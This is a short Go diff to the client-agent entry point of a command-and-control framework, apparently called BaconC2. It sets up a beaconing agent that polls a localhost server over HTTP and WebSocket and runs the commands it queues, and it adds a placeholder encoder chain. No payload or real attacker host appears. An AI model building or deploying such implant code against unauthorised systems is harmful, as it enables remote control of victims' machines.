@@ -15,23 +15,25 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
 	"github.com/google/uuid"
 )
 
 func main() {
-	cfg := config.AgentConfig{
+	cfg := &config.AgentConfig{
 		AgentID:        generateAgentID(),
 		ServerURL:      "http://localhost:8081",
-		BeaconInterval: 10 * time.Second, // Default beacon interval
+		BeaconInterval: 10 * time.Second,
 		Protocol:       "http",
 	}
 	cmdQueue := queue.NewMemoryQueue[models.Command]()
 	resultQueue := queue.NewMemoryQueue[models.CommandResult]()
+	encoderChain := encoders.NewChainEncoder([]encoders.Encoder{encoders.DummyEncoder{}})
 
-	transportProtocol := transport.NewHTTPTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue)
+	transportProtocol := transport.NewHTTPClientTransport(cfg.ServerURL, cfg.AgentID, cmdQueue, resultQueue, encoderChain)
 
 	wsTransport := transport.NewWebSocketTransport(cfg.ServerURL, cfg.AgentID)
-	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, &cfg)
+	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg)
 
 	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
 	if err := client.Initialize(); err != nil {
